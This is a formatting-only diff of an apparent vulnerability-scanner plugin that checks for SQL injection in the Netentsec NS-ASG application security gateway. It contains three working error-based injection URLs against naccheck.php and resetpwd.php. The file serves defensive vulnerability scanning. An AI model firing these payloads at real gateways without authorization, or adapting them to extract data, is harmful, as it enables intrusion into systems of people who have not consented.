@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = 'Netentsec_0004'  # 平台漏洞编号，留空
     name = '网康NS-ASG 应用安全网关SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-04-30'  # 漏洞公布时间
     desc = '''
         网康 NS-ASG 应用安全网关多处SQL注入漏洞：
@@ -21,6 +23,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '网康应用安全网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'db2eb8ce-7180-4a10-9e2b-f3fb40bf9cb6'
@@ -35,17 +38,20 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer: http://www.wooyun.org/bugs/wooyun-2014-058932
-            #refer: http://www.wooyun.org/bugs/wooyun-2014-058971
-            #refer: http://www.wooyun.org/bugs/wooyun-2014-058988
-            #refer: http://www.wooyun.org/bugs/wooyun-2014-077810
+            # refer: http://www.wooyun.org/bugs/wooyun-2014-058932
+            # refer: http://www.wooyun.org/bugs/wooyun-2014-058971
+            # refer: http://www.wooyun.org/bugs/wooyun-2014-058988
+            # refer: http://www.wooyun.org/bugs/wooyun-2014-077810
             hh = hackhttp.hackhttp()
             arg = self.target
-            #报错注入
+            # 报错注入
             payloads = [
-                arg + '/nac/naccheck.php?username=test%2527%20and%201=extractvalue(0x1,concat(0x23,(select%20md5(1))))%23',
-                arg + '/vpnweb/resetpwd/resetpwd.php?action=update&UserId=extractvalue(0x1,%20concat(0x23,%20(select%20md5(1))))',
-                arg + '/vpnweb/resetpwd/resetpwd.php?action=update&password1=111111&UserId=1%0a%0dand%0a%0d1=(updatexml(1,concat(0x23,md5(1)),1))%23',
+                arg +
+                '/nac/naccheck.php?username=test%2527%20and%201=extractvalue(0x1,concat(0x23,(select%20md5(1))))%23',
+                arg +
+                '/vpnweb/resetpwd/resetpwd.php?action=update&UserId=extractvalue(0x1,%20concat(0x23,%20(select%20md5(1))))',
+                arg +
+                '/vpnweb/resetpwd/resetpwd.php?action=update&password1=111111&UserId=1%0a%0dand%0a%0d1=(updatexml(1,concat(0x23,md5(1)),1))%23',
             ]
             md5_1 = 'c4ca4238a0b923820dcc509a6f75849'
             for payload in payloads:
@@ -61,6 +67,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
